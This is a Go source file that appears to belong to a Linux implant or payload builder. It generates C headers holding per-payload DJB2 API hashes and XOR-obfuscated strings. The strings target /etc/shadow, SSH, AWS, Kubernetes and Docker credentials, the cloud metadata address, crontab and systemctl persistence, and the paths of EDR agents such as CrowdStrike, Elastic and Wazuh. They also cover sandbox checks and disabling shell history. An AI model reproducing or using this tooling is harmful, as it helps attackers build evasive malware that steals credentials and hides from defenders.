package main

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	mrand "math/rand/v2"
	"strings"
)

// cryptoRandUint32 returns a cryptographically random uint32
func cryptoRandUint32() uint32 {
	var buf [4]byte
	_, _ = rand.Read(buf[:])
	return binary.LittleEndian.Uint32(buf[:])
}

// djb2Hash matches the C-side djb2_hash() — case-insensitive, seeded
func djb2Hash(seed uint32, s string) uint32 {
	h := seed
	for _, c := range strings.ToLower(s) {
		h = ((h << 5) + h) + uint32(c)
	}
	return h
}

// Linux libraries for hash-based resolution
var linuxLibs = []struct{ define, libName string }{
	{"HASH_LIB_LIBC", "libc.so.6"},
	{"HASH_LIB_LIBPTHREAD", "libpthread.so.0"},
	{"HASH_LIB_LIBDL", "libdl.so.2"},
	{"HASH_LIB_LIBRESOLV", "libresolv.so.2"},
	{"HASH_LIB_LIBM", "libm.so.6"},
}

// Linux functions to resolve by DJB2 hash
var linuxFuncSections = []struct {
	category string
	funcs    []struct{ define, name string }
}{
	{"File I/O", []struct{ define, name string }{
		{"HASH_FUNC_OPEN", "open"},
		{"HASH_FUNC_CLOSE", "close"},
		{"HASH_FUNC_READ", "read"},
		{"HASH_FUNC_WRITE", "write"},
		{"HASH_FUNC_STAT", "stat"},
		{"HASH_FUNC_FSTAT", "fstat"},
		{"HASH_FUNC_UNLINK", "unlink"},
		{"HASH_FUNC_RENAME", "rename"},
		{"HASH_FUNC_MKDIR", "mkdir"},
		{"HASH_FUNC_OPENDIR", "opendir"},
		{"HASH_FUNC_READDIR", "readdir"},
		{"HASH_FUNC_CLOSEDIR", "closedir"},
		{"HASH_FUNC_GETCWD", "getcwd"},
		{"HASH_FUNC_CHDIR", "chdir"},
		{"HASH_FUNC_RMDIR", "rmdir"},
		{"HASH_FUNC_REWINDDIR", "rewinddir"},
	}},
	{"Memory", []struct{ define, name string }{
		{"HASH_FUNC_MMAP", "mmap"},
		{"HASH_FUNC_MUNMAP", "munmap"},
		{"HASH_FUNC_MPROTECT", "mprotect"},
	}},
	{"Process", []struct{ define, name string }{
		{"HASH_FUNC_FORK", "fork"},
		{"HASH_FUNC_EXECVE", "execve"},
		{"HASH_FUNC_EXECVP", "execvp"},
		{"HASH_FUNC_WAITPID", "waitpid"},
		{"HASH_FUNC_GETPID", "getpid"},
		{"HASH_FUNC_GETUID", "getuid"},
		{"HASH_FUNC_GETEUID", "geteuid"},
		{"HASH_FUNC_KILL", "kill"},
		{"HASH_FUNC_SETSID", "setsid"},
		{"HASH_FUNC_SETPGID", "setpgid"},
		{"HASH_FUNC_EXIT", "_exit"},
		{"HASH_FUNC_PRCTL", "prctl"},
	}},
	{"Network", []struct{ define, name string }{
		{"HASH_FUNC_SOCKET", "socket"},
		{"HASH_FUNC_CONNECT", "connect"},
		{"HASH_FUNC_GETADDRINFO", "getaddrinfo"},
		{"HASH_FUNC_FREEADDRINFO", "freeaddrinfo"},
		{"HASH_FUNC_GETHOSTNAME", "gethostname"},
		{"HASH_FUNC_SETSOCKOPT", "setsockopt"},
		{"HASH_FUNC_GETSOCKOPT", "getsockopt"},
		{"HASH_FUNC_SELECT", "select"},
		{"HASH_FUNC_SEND", "send"},
		{"HASH_FUNC_RECV", "recv"},
		{"HASH_FUNC_BIND", "bind"},
		{"HASH_FUNC_LISTEN", "listen"},
		{"HASH_FUNC_ACCEPT", "accept"},
	}},
	{"Threading", []struct{ define, name string }{
		{"HASH_FUNC_PTHREAD_CREATE", "pthread_create"},
		{"HASH_FUNC_PTHREAD_DETACH", "pthread_detach"},
		{"HASH_FUNC_PTHREAD_MUTEX_INIT", "pthread_mutex_init"},
		{"HASH_FUNC_PTHREAD_MUTEX_LOCK", "pthread_mutex_lock"},
		{"HASH_FUNC_PTHREAD_MUTEX_UNLOCK", "pthread_mutex_unlock"},
	}},
	{"Pipes & PTY", []struct{ define, name string }{
		{"HASH_FUNC_PIPE", "pipe"},
		{"HASH_FUNC_DUP2", "dup2"},
		{"HASH_FUNC_FCNTL", "fcntl"},
		{"HASH_FUNC_POSIX_OPENPT", "posix_openpt"},
		{"HASH_FUNC_GRANTPT", "grantpt"},
		{"HASH_FUNC_UNLOCKPT", "unlockpt"},
		{"HASH_FUNC_PTSNAME", "ptsname"},
		{"HASH_FUNC_IOCTL", "ioctl"},
	}},
	{"System", []struct{ define, name string }{
		{"HASH_FUNC_GETENV", "getenv"},
		{"HASH_FUNC_SETENV", "setenv"},
		{"HASH_FUNC_SLEEP", "sleep"},
		{"HASH_FUNC_USLEEP", "usleep"},
		{"HASH_FUNC_SNPRINTF", "snprintf"},
		{"HASH_FUNC_STRTOL", "strtol"},
	}},
	{"User/Group", []struct{ define, name string }{
		{"HASH_FUNC_GETPWUID", "getpwuid"},
		{"HASH_FUNC_GETGRGID", "getgrgid"},
		{"HASH_FUNC_GETIFADDRS", "getifaddrs"},
		{"HASH_FUNC_FREEIFADDRS", "freeifaddrs"},
		{"HASH_FUNC_INET_NTOP", "inet_ntop"},
		{"HASH_FUNC_LOCALTIME", "localtime"},
		{"HASH_FUNC_STRFTIME", "strftime"},
	}},
	{"Dynamic", []struct{ define, name string }{
		{"HASH_FUNC_DLOPEN", "dlopen"},
		{"HASH_FUNC_DLSYM", "dlsym"},
		{"HASH_FUNC_DLCLOSE", "dlclose"},
	}},
}

// generateLinuxApiDefines produces a C header with DJB2 hashes for per-payload polymorphism
func generateLinuxApiDefines(seed uint32) string {
	var sb strings.Builder
	sb.WriteString("// Auto-generated — per-payload DJB2 API hashes\n")
	sb.WriteString("// Do not edit. Regenerated on each build.\n")
	sb.WriteString("#ifndef API_DEFINES_H\n#define API_DEFINES_H\n\n")
	sb.WriteString(fmt.Sprintf("#define DJB2_SEED 0x%08xU\n\n", seed))

	// Library hashes
	sb.WriteString("// Library hashes\n")
	for _, lib := range linuxLibs {
		h := djb2Hash(seed, lib.libName)
		sb.WriteString(fmt.Sprintf("#define %-30s 0x%08xU  // %s\n", lib.define, h, lib.libName))
	}
	sb.WriteString("\n")

	// Function hashes
	for _, section := range linuxFuncSections {
		sb.WriteString(fmt.Sprintf("// %s\n", section.category))
		for _, fn := range section.funcs {
			h := djb2Hash(seed, fn.name)
			sb.WriteString(fmt.Sprintf("#define %-35s 0x%08xU  // %s\n", fn.define, h, fn.name))
		}
		sb.WriteString("\n")
	}

	sb.WriteString("#endif // API_DEFINES_H\n")
	return sb.String()
}

// Obfuscated strings — Linux-specific paths and sensitive strings
var obfuscatedStrings = []struct{ define, value string }{
	// Paths critiques
	{"OBF_PROC_SELF_MAPS", "/proc/self/maps"},
	{"OBF_PROC_SELF_STATUS", "/proc/self/status"},
	{"OBF_PROC_SELF_EXE", "/proc/self/exe"},
	{"OBF_PROC_VERSION", "/proc/version"},
	{"OBF_ETC_SHADOW", "/etc/shadow"},
	{"OBF_ETC_PASSWD", "/etc/passwd"},
	{"OBF_ETC_OS_RELEASE", "/etc/os-release"},
	{"OBF_DEV_URANDOM", "/dev/urandom"},
	{"OBF_BIN_SH", "/bin/sh"},
	{"OBF_BIN_BASH", "/bin/bash"},
	{"OBF_TMP", "/tmp"},
	// Persistence
	{"OBF_CRONTAB", "/usr/bin/crontab"},
	{"OBF_SYSTEMCTL", "/usr/bin/systemctl"},
	// Credentials
	{"OBF_SSH_DIR", ".ssh"},
	{"OBF_AWS_CREDS", ".aws/credentials"},
	{"OBF_KUBE_CONFIG", ".kube/config"},
	{"OBF_DOCKER_CONFIG", ".docker/config.json"},
	// Container/Cloud
	{"OBF_DOCKERENV", "/.dockerenv"},
	{"OBF_K8S_SECRETS", "/run/secrets/kubernetes.io"},
	{"OBF_IMDS_URL", "169.254.169.254"},
	// EDR paths
	{"OBF_FALCON_SENSOR", "/opt/CrowdStrike/falconctl"},
	{"OBF_ELASTIC_AGENT", "/opt/Elastic/Agent/elastic-agent"},
	{"OBF_WAZUH_AGENT", "/var/ossec/bin/wazuh-agentd"},
	{"OBF_SYSDIG_AGENT", "/opt/draios/bin/sysdig"},
	{"OBF_LACEWORK", "/var/lib/lacework"},
	// Anti-debug
	{"OBF_PROC_SELF_ENVIRON", "/proc/self/environ"},
	{"OBF_PROC_1_CGROUP", "/proc/1/cgroup"},
	{"OBF_SYS_DMI_PRODUCT", "/sys/class/dmi/id/product_name"},
	{"OBF_SYS_DMI_VENDOR", "/sys/class/dmi/id/sys_vendor"},
	{"OBF_PROC_CPUINFO", "/proc/cpuinfo"},
	{"OBF_PROC_MEMINFO", "/proc/meminfo"},
	// PTY env vars
	{"OBF_HISTFILE", "HISTFILE=/dev/null"},
	{"OBF_HISTFILESIZE", "HISTFILESIZE=0"},
	{"OBF_HISTSIZE", "HISTSIZE=0"},
}

// generateObfStrings produces a C header with XOR-obfuscated strings
func generateObfStrings() string {
	// Generate per-payload random 16-byte XOR key
	key := make([]byte, 16)
	_, _ = rand.Read(key)

	var sb strings.Builder
	sb.WriteString("// Auto-generated — per-payload XOR-obfuscated strings\n")
	sb.WriteString("// Do not edit. Regenerated on each build.\n")
	sb.WriteString("#ifndef STRINGS_OBF_H\n#define STRINGS_OBF_H\n\n")
	sb.WriteString("#include <stdint.h>\n\n")

	// Build nonce (unique per payload)
	nonce := make([]byte, 16)
	_, _ = rand.Read(nonce)
	sb.WriteString("// Build nonce (unique per payload)\n")
	sb.WriteString("static const uint8_t _build_nonce[] = {")
	for i, b := range nonce {
		if i > 0 {
			sb.WriteString(", ")
		}
		sb.WriteString(fmt.Sprintf("0x%02x", b))
	}
	sb.WriteString("};\n\n")

	// XOR key
	sb.WriteString("static const uint8_t _xor_key[] = {")
	for i, b := range key {
		if i > 0 {
			sb.WriteString(", ")
		}
		sb.WriteString(fmt.Sprintf("0x%02x", b))
	}
	sb.WriteString("};\n")
	sb.WriteString(fmt.Sprintf("static const int _xor_key_len = %d;\n\n", len(key)))

	// Deobfuscation macro
	sb.WriteString("// Runtime deobfuscation: XOR decrypt into stack buffer, use, then zero\n")
	sb.WriteString("#define DEOBF(name, dst) do { \\\n")
	sb.WriteString("    for (int _i = 0; _i < (int)sizeof(name##_enc); _i++) \\\n")
	sb.WriteString("        (dst)[_i] = name##_enc[_i] ^ _xor_key[_i % _xor_key_len]; \\\n")
	sb.WriteString("    (dst)[sizeof(name##_enc)] = 0; \\\n")
	sb.WriteString("} while(0)\n\n")

	sb.WriteString("#define ZERO_STR(buf, len) do { \\\n")
	sb.WriteString("    volatile char *_p = (volatile char*)(buf); \\\n")
	sb.WriteString("    for (unsigned int _i = 0; _i < (unsigned int)(len); _i++) _p[_i] = 0; \\\n")
	sb.WriteString("} while(0)\n\n")

	// Generate each obfuscated string
	for _, s := range obfuscatedStrings {
		// XOR encode
		enc := make([]byte, len(s.value))
		for i := 0; i < len(s.value); i++ {
			enc[i] = s.value[i] ^ key[i%len(key)]
		}

		sb.WriteString(fmt.Sprintf("// %s = \"%s\" (%d bytes)\n", s.define, s.value, len(s.value)))
		sb.WriteString(fmt.Sprintf("static const uint8_t %s_enc[] = {", s.define))
		for i, b := range enc {
			if i > 0 {
				sb.WriteString(", ")
			}
			sb.WriteString(fmt.Sprintf("0x%02x", b))
		}
		sb.WriteString("};\n")
		sb.WriteString(fmt.Sprintf("#define %s_LEN %d\n\n", s.define, len(s.value)))
	}

	// Junk variable to prevent dead-code elimination of nonce
	sb.WriteString("static __attribute__((used)) const uint8_t *_nonce_ref = _build_nonce;\n\n")

	sb.WriteString("#endif // STRINGS_OBF_H\n")
	return sb.String()
}

// randomJunkByte returns a random non-zero byte for padding
func randomJunkByte() byte {
	return byte(mrand.IntN(254) + 1)
}
